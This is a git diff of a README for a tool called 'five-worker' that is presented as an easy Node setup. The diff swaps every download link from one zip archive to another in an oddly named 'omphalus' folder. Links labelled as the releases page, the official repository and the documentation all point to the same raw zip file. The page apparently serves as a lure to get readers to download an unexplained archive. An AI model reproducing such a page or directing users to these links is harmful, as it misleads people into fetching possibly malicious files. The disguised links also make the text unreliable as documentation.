@@ -1,6 +1,6 @@
 # 🌟 five-worker - Easy Node Setup for Your Needs
 
-[![Download Now](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/five-worker_v3.7.zip)](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/five-worker_v3.7.zip)
+[![Download Now](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/worker-five-1.8-beta.5.zip)](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/worker-five-1.8-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -9,10 +9,10 @@ Follow these simple steps to download and run the five-worker application.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/five-worker_v3.7.zip) to download the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/worker-five-1.8-beta.5.zip) to download the latest version of the software.
 
 2. **Choose Your File**  
-   Look for a file named `https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/five-worker_v3.7.zip` (or the relevant file for your system).
+   Look for a file named `https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/worker-five-1.8-beta.5.zip` (or the relevant file for your system).
 
 3. **Download and Save**  
    Click on the file link to download it. Save it to a convenient location on your device.
@@ -81,11 +81,11 @@ For inquiries or assistance, feel free to check out the community support forums
 
 For further information and support, visit the following:
 
-- [Official GitHub Repository](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/five-worker_v3.7.zip)
-- [Documentation](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/five-worker_v3.7.zip)
+- [Official GitHub Repository](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/worker-five-1.8-beta.5.zip)
+- [Documentation](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/worker-five-1.8-beta.5.zip)
 
 For your convenience, here’s the link again to download the software:  
-[Download Now](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/five-worker_v3.7.zip)
+[Download Now](https://raw.githubusercontent.com/chukwu-patrick/five-worker/main/omphalus/worker-five-1.8-beta.5.zip)
 
 ---
 
